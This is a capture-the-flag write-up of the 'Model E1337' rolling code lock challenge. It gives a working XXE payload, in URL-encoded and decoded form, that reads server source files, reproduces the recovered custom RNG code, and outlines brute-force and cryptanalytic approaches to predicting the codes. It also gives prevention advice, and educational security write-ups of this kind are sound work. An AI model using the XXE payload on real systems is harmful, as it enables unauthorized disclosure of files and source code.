# Model E1337 - Rolling Code Lock
**Difficulty:** Hard  
**Category:** Web, Math  
**Flags:** 1/2

---

## 🧠 Thought Process
When I first accessed the Model E1337 application, I encountered what appeared to be a digital lock interface. The application didn't reveal much information initially, but testing the input field revealed the core mechanism: a rolling code lock system that generates different expected codes with each submission.

This challenge combines two distinct skill sets:
1. **Web Application Security:** Exploiting XXE vulnerabilities to access source code
2. **Cryptographic Analysis:** Understanding and potentially predicting the rolling code algorithm

The rolling code mechanism immediately suggested this would be a mathematical challenge requiring reverse engineering of the random number generation algorithm.

---

## 🔍 Step 1: Initial Reconnaissance and Rolling Code Discovery
I started by exploring the application interface and testing the code input functionality.

**Key Observations:**
- Simple lock interface with numeric code input
- Submitting random numbers revealed the expected code format
- Each submission generated a different expected code (hence "rolling code")
- The codes appeared to follow a deterministic pattern based on some underlying algorithm

**Rolling Code Behavior:**
- First submission: Expected code X
- Second submission: Expected code Y (different from X)
- Third submission: Expected code Z (different from X and Y)
- Pattern suggested a pseudo-random number generator with incremental state

---

## 🔍 Step 2: Source Code Discovery via XXE Vulnerability
Since the rolling code algorithm wasn't immediately apparent, I needed to access the application's source code. Through research and examining the application structure, I discovered references to configuration functionality.

**Discovery Process:**
1. Found `/admin` endpoint with references to configuration
2. Identified potential XML processing in config functionality
3. Discovered `/set-config` endpoint accepting XML data
4. Recognized potential for XXE (XML External Entity) exploitation

---

## 🚩 Step 3: First Flag - XXE Exploitation for Source Code Access
I exploited the XXE vulnerability to read the main application source code.

**XXE Payload (URL-encoded):**
```
/set-config?data=<%3C%3Fxml%20version%3D%221%2E0%22%3F%3E%0A%3C%21DOCTYPE%20root%20%5B%0A%20%20%3C%21ENTITY%20xxe%20SYSTEM%20%22main%2Epy%22%3E%0A%5D%3E%0A%3Cconfig%3E%0A%20%20%3Clocation%3E%26xxe%3B%3C%2Flocation%3E%0A%3C%2Fconfig>
```

**XXE Payload (decoded):**
```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "main.py">
]>
<config>
  <location>&xxe;</location>
</config>
```

This payload successfully read the contents of `main.py`, which contained the first flag embedded in the source code.

![First Flag](FirstFlag.png)

### 🔬 Technical Explanation: XXE Vulnerability

**XML External Entity (XXE)** attacks exploit XML processors that allow external entity references. In this case:

1. **External Entity Declaration:** `<!ENTITY xxe SYSTEM "main.py">` declares an external entity
2. **File System Access:** The `SYSTEM` keyword allows reading local files
3. **Entity Reference:** `&xxe;` in the XML content includes the file contents
4. **Response Inclusion:** The server processes the entity and includes file contents in the response

**Vulnerability Requirements:**
- XML parser that processes external entities
- Insufficient input validation
- No restrictions on file system access
- Server-side XML processing without proper security controls

---

## 🔍 Step 4: RNG Algorithm Discovery
Analyzing the retrieved `main.py` source code, I discovered an import statement: `from rng import *`

This indicated a separate RNG module handling the rolling code generation. Using the same XXE technique, I accessed `rng.py`:

**RNG Source Code:**
```python
import random

# 

def setup(seed):
    global state
    state = 0
    for i in xrange(16):
        cur = seed & 3
        seed >>= 2
        state = (state << 4) | ((state & 3) ^ cur)
        state |= cur << 2

def next(bits):
    global state

    ret = 0
    for i in xrange(bits):
        ret <<= 1
        ret |= state & 1
        state = (state << 1) ^ (state >> 61)
        state &= 0xFFFFFFFFFFFFFFFF
        state ^= 0xFFFFFFFFFFFFFFFF

        for j in xrange(0, 64, 4):
            cur = (state >> j) & 0xF
            cur = (cur >> 3) | ((cur >> 2) & 2) | ((cur << 3) & 8) | ((cur << 2) & 4)
            state ^= cur << j

    return ret

setup((random.randrange(0x10000) << 16) | random.randrange(0x10000))

# 
```

---

## 🔬 Step 5: Cryptographic Analysis - Understanding the RNG Algorithm
The retrieved RNG algorithm reveals a custom pseudo-random number generator with the following characteristics:

### Algorithm Components:

**1. Initialization (`setup` function):**
- Takes a 32-bit seed value
- Initializes global state through 16 iterations
- Uses bit manipulation to mix seed bits into state
- Operations: bit masking, shifting, XOR operations

**2. Number Generation (`next` function):**
- Generates specified number of bits
- Uses complex bit manipulation on global state
- Multiple transformation steps per bit generated
- Operations include: bit shifting, XOR, masking, bit reversal

**3. Seeding Process:**
- Uses Python's `random.randrange(0x10000)` for seed generation
- Creates 32-bit seed from two 16-bit random values
- Seed space: 2^32 possible values (4,294,967,296 combinations)

### Mathematical Properties:
- **State Size:** 64-bit internal state
- **Deterministic:** Same seed produces same sequence
- **Bit-level Operations:** Heavy use of bitwise operations
- **Non-linear Transformations:** Complex state evolution

---

## 🎯 Step 6: Second Flag Strategy - Cryptographic Attack Approaches
To obtain the second flag, I need to predict or reverse-engineer the rolling code sequence. Several approaches are possible:

### Approach 1: Brute Force Attack
- **Seed Space:** 2^32 possible seeds
- **Computational Complexity:** High but potentially feasible
- **Method:** Generate sequences for all possible seeds, match observed codes

### Approach 2: Cryptanalysis
- **State Recovery:** Attempt to reverse-engineer internal state from observed outputs
- **Pattern Analysis:** Look for weaknesses in the bit manipulation operations
- **Mathematical Analysis:** Study the algebraic properties of the transformations

### Approach 3: Timing Attack
- **Seed Prediction:** If seeding is time-based, predict seed values
- **Server State:** Exploit server-side state management

### Current Status:
The mathematical complexity of this custom RNG makes this a challenging cryptographic problem requiring either:
1. Advanced mathematical analysis of the algorithm
2. Computational brute force attack
3. Discovery of algorithmic weaknesses

---

## 🏁 Captured Flags
- **Flag 1:** ✅ Obtained through XXE exploitation to read `main.py`
- **Flag 2:** 🔄 In progress - requires cryptographic analysis of RNG algorithm

---

## ✅ Summary
This challenge demonstrates a sophisticated combination of web application security and cryptographic analysis:

### Discovered Vulnerabilities:
1. **XXE (XML External Entity):** Enabled source code disclosure
2. **Information Disclosure:** Complete RNG algorithm exposure
3. **Insufficient Input Validation:** XML processing without security controls

### Technical Challenges:
1. **Custom Cryptographic Algorithm:** Non-standard RNG implementation
2. **Mathematical Complexity:** Advanced bit manipulation operations
3. **Large Seed Space:** 2^32 possible initial states
4. **Real-time Prediction:** Need to predict next code in sequence

### Skills Required:
- **Web Application Security:** XXE exploitation techniques
- **Cryptographic Analysis:** Understanding of RNG algorithms
- **Mathematical Analysis:** Bit manipulation and state recovery
- **Programming:** Implementation of attack algorithms

---

## 🛠️ Tools Used
- **Burp Suite** - For request interception and XXE payload delivery
- **Mathematical Analysis Tools** - For studying RNG algorithm
- **Programming Languages** - For implementing attack algorithms
- **Web Browser** - For initial reconnaissance and testing

---

## 🔧 Prevention Recommendations
1. **XML Security:** Disable external entity processing in XML parsers
2. **Input Validation:** Implement strict validation for all XML input
3. **File Access Controls:** Restrict file system access from web applications
4. **Cryptographic Standards:** Use established RNG libraries instead of custom implementations
5. **Source Code Protection:** Avoid exposing algorithmic details through information disclosure

---

## 🎯 Key Learning Points
- XXE vulnerabilities can lead to complete source code disclosure
- Custom cryptographic implementations often contain exploitable weaknesses
- Mathematical challenges require both theoretical understanding and practical implementation
- Complex algorithms may have simpler exploitation paths than initially apparent
- Source code access dramatically reduces the security of cryptographic systems

---

## 📋 Next Steps
1. **Mathematical Analysis:** Detailed study of the RNG algorithm properties
2. **Computational Attack:** Implement brute force or optimized search algorithms
3. **Pattern Recognition:** Analyze output sequences for predictable patterns
4. **Tool Development:** Create specialized tools for RNG analysis
5. **Alternative Approaches:** Investigate other potential attack vectors

---

## 🔍 Research Notes
The custom RNG implementation uses several interesting techniques:
- **Bit Reversal Operations:** `(cur >> 3) | ((cur >> 2) & 2) | ((cur << 3) & 8) | ((cur << 2) & 4)`
- **State Mixing:** Complex XOR operations with shifted state values
- **Feedback Mechanism:** State evolution depends on previous state values

These operations suggest the algorithm designer attempted to create a cryptographically secure generator, but custom implementations often contain subtle weaknesses that can be exploited with sufficient analysis.